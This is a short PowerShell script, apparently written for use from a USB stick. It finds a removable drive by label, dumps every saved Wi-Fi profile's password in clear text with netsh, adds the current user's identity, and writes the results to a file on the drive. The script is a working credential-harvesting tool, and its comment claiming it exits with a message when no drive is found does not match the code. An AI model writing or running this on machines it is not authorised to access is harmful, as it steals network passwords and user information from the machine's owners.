#Finding the USB Drive: The command Get-WmiObject queries for devices with DriveType = 2, which represents removable storage. Replace "USB_LABEL" with the actual label of your USB drive.
#Saving the Output: Once the USB drive is detected, the script saves test.txt with Wi-Fi profiles, passwords, and user information directly to the USB.
#This script will exit with a message if it doesn’t find a USB drive with the specified label.

$usbDrive = Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE DriveType = 2" | Where-Object { $_.Label -eq "USB_LABEL" }

if ($usbDrive) {
    $filePath = "$($usbDrive.DriveLetter)\test.txt"
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":\s*")[1].Trim() }
    $output = ""

    $wifiProfiles | ForEach-Object {
        $profile = $_
        $profileInfo = netsh wlan show profile name="$profile" key=clear
        $passwordMatch = $profileInfo | Select-String "Key Content\s*:\s*(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value }
        $password = if ($passwordMatch) { $passwordMatch } else { "N/A" }
        $output += "Profile: $profile`nPassword: $password`n`n"
    }

    $userInfo = whoami
    $output += "`nUser Info: $userInfo`n"

    $output | Out-File -FilePath $filePath -Encoding utf8
}
